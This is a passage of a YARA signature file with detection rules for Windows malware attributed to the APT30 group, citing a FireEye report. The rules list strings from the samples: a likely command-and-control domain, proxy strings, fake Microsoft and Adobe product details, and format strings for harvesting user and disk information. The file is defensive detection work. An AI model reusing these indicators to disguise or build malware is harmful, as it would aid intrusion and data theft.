\"37aee58655f5859e60ece6b249107b87\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MYUSER32.dll\" fullword ascii\n      $s1 = \"MYADVAPI32.dll\" fullword ascii\n      $s2 = \"MYWSOCK32.dll\" fullword ascii\n      $s3 = \"MYMSVCRT.dll\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_4_RID2BAD : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetStartupIn\" ascii\n      $s1 = \"enMutex\" ascii\n      $s2 = \"tpsvimi\" ascii\n      $s3 = \"reateProcesy\" ascii\n      $s5 = \"FreeLibr1y*S\" ascii\n      $s6 = \"foAModuleHand\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_5_RID2BAE : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n      $s3 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n      $s7 = \"msmsgs\" fullword wide\n      $s10 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_7_RID2BB0 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"datain\" fullword ascii\n      $s3 = \"C:\\\\Prog\" ascii\n      $s4 = \"$LDDATA$\" ascii\n      $s5 = \"Maybe a Encrypted Flash\" fullword ascii\n      $s6 = \"Jean-loup Gailly\" ascii\n      $s8 = \"deflate 1.1.3 Copyright\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_E_RID2C19 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:41\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1dbb584e19499e26398fb0a7aa2a01b7\"\n      hash2 = \"572c9cd4388699347c0b2edb7c6f5e25\"\n      hash3 = \"8ff473bedbcc77df2c49a91167b1abeb\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Nkfvtyvn}\" ascii\n      $s6 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_8_RID2BB1 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ateProcessA\" ascii\n      $s1 = \"Ternel32.dllFQ\" fullword ascii\n      $s2 = \"StartupInfoAModuleHand\" fullword ascii\n      $s3 = \"OpenMutex\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_B_RID2C16 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0fcb4ffe2eb391421ec876286c9ddb6c\"\n      hash2 = \"29395c528693b69233c1c12bef8a64b3\"\n      hash3 = \"4c6b21e98ca03e0ef0910e07cef45dac\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Moziea/4.0\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_I_RID2C1D : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fe211c7a081c1dac46e3935f7c614549\"\n      hash2 = \"8c9db773d387bf9b3f2b6a532e4c937c\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Copyright 2012 Google Inc. All rights reserved.\" fullword wide\n      $s1 = \"(Prxy%c-%s:%u)\" fullword ascii\n      $s2 = \"Google Inc.\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_9_RID2BB2 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Windo\" ascii\n      $s2 = \"oHHOSTR\" ascii\n      $s3 = \"Softwa]\\\\Mic\" ascii\n      $s4 = \"Startup'T\" ascii\n      $s6 = \"Ora\\\\%^\" ascii\n      $s7 = \"\\\\Ohttp=r\" ascii\n      $s17 = \"help32Snapshot0L\" ascii\n      $s18 = \"TimUmoveH\" ascii\n      $s20 = \"WideChc[lobalAl\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_10_RID2BDA : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Version 4.7.3001\" fullword wide\n      $s1 = \"Copyright (c) Microsoft Corporation 2004\" fullword wide\n      $s2 = \"Microsoft(R) is a registered trademark of Microsoft Corporation in the U\" wide\n      $s3 = \"!! Use Connect Method !!\" fullword ascii\n      $s4 = \"(Prxy%c-%s:%u)\" fullword ascii\n      $s5 = \"msmsgs\" fullword wide\n      $s18 = \"(Prxy-No)\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_11_RID2BDB : APT DEMO FILE G0013 T1543_003 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"System\\\\CurrentControlSet\\\\control\\\\ComputerName\\\\ComputerName\" fullword ascii\n      $s1 = \"msofscan.exe\" fullword wide\n      $s2 = \"Mozilla/4.0 (compatible; MSIE 5.0; Win32)\" fullword ascii\n      $s3 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n      $s4 = \"Windows XP Professional x64 Edition or Windows Server 2003\" fullword ascii\n      $s9 = \"NetEagle_Scout - \" fullword ascii\n      $s10 = \"Server 4.0, Enterprise Edition\" fullword ascii\n      $s11 = \"Windows 3.1(Win32s)\" fullword ascii\n      $s12 = \"%s%s%s %s\" fullword ascii\n      $s13 = \"Server 4.0\" fullword ascii\n      $s15 = \"Windows Millennium Edition\" fullword ascii\n      $s16 = \"msofscan\" fullword wide\n      $s17 = \"Eagle-Norton360-OfficeScan\" fullword ascii\n      $s18 = \"Workstation 4.0\" fullword ascii\n      $s19 = \"2003 Microsoft Office system\" fullword wide\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_12_RID2BDC : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Richic\" fullword ascii\n      $s1 = \"Accept: image/gif, */*\" fullword ascii\n      $s2 = \"----------------g_nAV=%d,hWnd:0x%X,className:%s,Title:%s,(%d,%d,%d,%d),BOOL=%d\" fullword ascii\n   condition: \n      filesize < 250KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_13_RID2BDD : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"msofscan.exe\" fullword wide\n      $s1 = \"Microsoft? is a registered trademark of Microsoft Corporation.\" fullword wide\n      $s2 = \"Microsoft Office Word Plugin Scan\" fullword wide\n      $s3 = \"? 2006 Microsoft Corporation.  All rights reserved.\" fullword wide\n      $s4 = \"msofscan\" fullword wide\n      $s6 = \"2003 Microsoft Office system\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_14_RID2BDE : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"AdobeReader.exe\" fullword wide\n      $s4 = \"10.1.7.27\" fullword wide\n      $s5 = \"Copyright 1984-2012 Adobe Systems Incorporated and its licensors. All ri\" wide\n      $s8 = \"Adobe Reader\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_15_RID2BDF : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Windo\" ascii\n      $s2 = \"HHOSTR\" ascii\n      $s3 = \"Softwa]\\\\Mic\" ascii\n      $s4 = \"Startup'T\" fullword ascii\n      $s17 = \"help32Snapshot0L\" fullword ascii\n      $s18 = \"TimUmoveH\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_16_RID2BE0 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Temp1020.txt\" ascii\n      $s1 = \"cmcbqyjs\" fullword ascii\n      $s2 = \"SPVSWh\\\\\" fullword ascii\n      $s4 = \"PSShxw@\" fullword ascii\n      $s5 = \"VWhHw@\" fullword ascii\n      $s7 = \"SVWhHw@\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_A_RID2C15 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f49aa1090fa478b9857e15695be4a89f8f3e594\"\n      hash2 = \"396116cfb51cee090822913942f6ccf81856c2fb\"\n      hash3 = \"fef9c3b4b35c226501f7d60816bb00331a904d5b\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"WPVWhhiA\" fullword ascii\n      $s6 = \"VPWVhhiA\" fullword ascii\n      $s11 = \"VPhhiA\" fullword ascii\n      $s12 = \"uUhXiA\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_18_RID2BE2 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:31\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"w.km-nyc.com\" fullword ascii\n      $s1 = \"tscv.exe\" fullword ascii\n      $s2 = \"Exit/app.htm\" ascii\n      $s3 = \"UBD:\\\\D\" ascii\n      $s4 = \"LastError\" ascii\n      $s5 = \"MicrosoftHaveAck\" ascii\n      $s7 = \"HHOSTR\" ascii\n      $s20 = \"XPL0RE.\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_G_RID2C1B : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%s\\\\%s\\\\%s=%s\" fullword ascii\n      $s1 = \"Copy File %s OK!\" fullword ascii\n      $s2 = \"%s Space:%uM,FreeSpace:%uM\" fullword ascii\n      $s4 = \"open=%s\" fullword ascii\n      $s5 = \"Maybe a Encrypted Flash Disk\" fullword ascii\n      $s12 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_19_RID2BE3 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\Program Files\\\\Common Files\\\\System\\\\wab32\" fullword ascii\n      $s1 = \"%s,Volume:%s,Type:%s,TotalSize:%uMB,FreeSize:%uMB\" fullword ascii\n      $s2 = \"\\\\TEMP\\\\\" ascii\n      $s3 = \"\\\\Temporary Internet Files\\\\\" ascii\n      $s5 = \"%s TotalSize:%u Bytes\" fullword ascii\n      $s6 = \"This Disk Maybe a Encrypted Flash Disk!\" fullword ascii\n      $s7 = \"User:%-32s\" fullword ascii\n      $s8 = \"\\\\Desktop\\\\\" ascii\n      $s9 = \"%s.%u_%u\" fullword ascii\n      $s10 = \"Nick:%-32s\" fullword ascii\n      $s11 = \"E-mail:%-32s\" fullword ascii\n      $s13 = \"%04u-%02u-%02u %02u:%02u:%02u\" fullword ascii\n      $s14 = \"Type:%-8s\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and 8 of them\n}\n\nrule APT30_Generic_E_v2_RID2D20 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 10:18:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Nkfvtyvn}duf_Z}{Ys\" fullword ascii\n      $s1 = \"Nkfvtyvn}*Zrswru1i\" fullword ascii\n      $s2 = \"Nkfvtyvn}duf_Z}{V\" fullword ascii\n      $s3 = \"Nkfvtyvn}*ZrswrumT\\\\b\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_20_RID2BDB : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:21\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"dizhi.gif\" fullword ascii\n      $s2 = \"Mozilla/u\" ascii\n      $s3 = \"XicrosoftHaveAck\" ascii\n      $s4 = \"flyeagles\" ascii\n      $s10 = \"iexplore.\" ascii\n      $s13 = \"WindowsGV\" fullword ascii\n      $s16 = \"CatePipe\" fullword ascii\n      $s17 = \"'QWERTY:/webpage3\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_21_RID2BDC : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service.dll\" fullword ascii\n      $s1 = \"(%s:%s %s)\" fullword ascii\n      $s2 = \"%s \\\"%s\\\",%s %s\" fullword ascii\n      $s5 = \"Proxy-%s:%u\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_22_RID2BDD : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"(\\\\TEMP\" fullword ascii\n      $s2 = \"Windows\\\\Cur\" fullword ascii\n      $s3 = \"LSSAS.exeJ\" fullword ascii\n      $s4 = \"QC:\\\\WINDOWS\" fullword ascii\n      $s5 = \"System Volume\" fullword ascii\n      $s8 = \"PROGRAM FILE\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_F_RID2C1A : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:51\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"09010917cd00dc8ddd21aeb066877aa2\"\n      hash2 = \"4c10a1efed25b828e4785d9526507fbc\"\n      hash3 = \"b7b282c9e3eca888cbdb5a856e07e8bd\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\~zlzl.exe\" ascii\n      $s2 = \"\\\\Internet Exp1orer\" ascii\n      $s3 = \"NodAndKabIsExcellent\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_23_RID2BDE : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:24:51\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"hostid\" ascii\n      $s1 = \"\\\\Window\" ascii\n      $s2 = \"%u:%u%s\" fullword ascii\n      $s5 = \"S2tware\\\\Mic\" ascii\n      $s6 = \"la/4.0 (compa\" ascii\n      $s7 = \"NameACKernel\" fullword ascii\n      $s12 = \"ToWideChc[lo\" fullword ascii\n      $s14 = \"help32SnapshotfL\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_24_RID2BDF : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:01\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dizhi.gif\" fullword ascii\n      $s3 = \"Mozilla/4.0\" fullword ascii\n      $s4 = \"lyeagles\" fullword ascii\n      $s6 = \"HHOSTR\" ascii\n      $s7 = \"#MicrosoftHaveAck7\" ascii\n      $s8 = \"iexplore.\" fullword ascii\n      $s17 = \"ModuleH\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_25_RID2BE0 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\" fullword ascii\n      $s2 = \"aragua\" fullword ascii\n      $s4 = \"\\\\driver32\\\\7$\" ascii\n      $s8 = \"System V\" fullword ascii\n      $s9 = \"Compu~r\" fullword ascii\n      $s10 = \"PROGRAM L\" fullword ascii\n      $s18 = \"GPRTMAX\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_26_RID2BE1 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"forcegue\" fullword ascii\n      $s3 = \"Windows\\\\Cur\" fullword ascii\n      $s4 = \"System Id\" fullword ascii\n      $s5 = \"Software\\\\Mic\" fullword ascii\n      $s6 = \"utiBy0ToWideCh&$a\" fullword ascii\n      $s10 = \"ModuleH\" fullword ascii\n      $s15 = \"PeekNamed6G\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_D_RID2C18 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"35dfb55f419f476a54241f46e624a1a4\"\n      hash2 = \"4fffcbdd4804f6952e0daf2d67507946\"\n      hash3 = \"597805832d45d522c4882f21db800ecf\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Windows Security Service Feedback\" fullword wide\n      $s1 = \"wssfmgr.exe\" fullword wide\n      $s2 = \"\\\\rb.htm\" ascii\n      $s3 = \"rb.htm\" fullword ascii\n      $s4 = \"cook5\" ascii\n      $s5 = \"5, 4, 2600, 0\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_27_RID2BE2 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:31\"\n      score = 95\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Mozilla/4.0\" fullword ascii\n      $s1 = \"dizhi.gif\" fullword ascii\n      $s5 = \"oftHaveAck+\" ascii\n      $s10 = \"HlobalAl\" fullword ascii\n      $s13 = \"$NtRND1$\" fullword ascii\n      $s14 = \"_NStartup\" ascii\n      $s16 = \"GXSYSTEM\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_28_RID2BE3 : APT DEMO FILE G0013 {\n   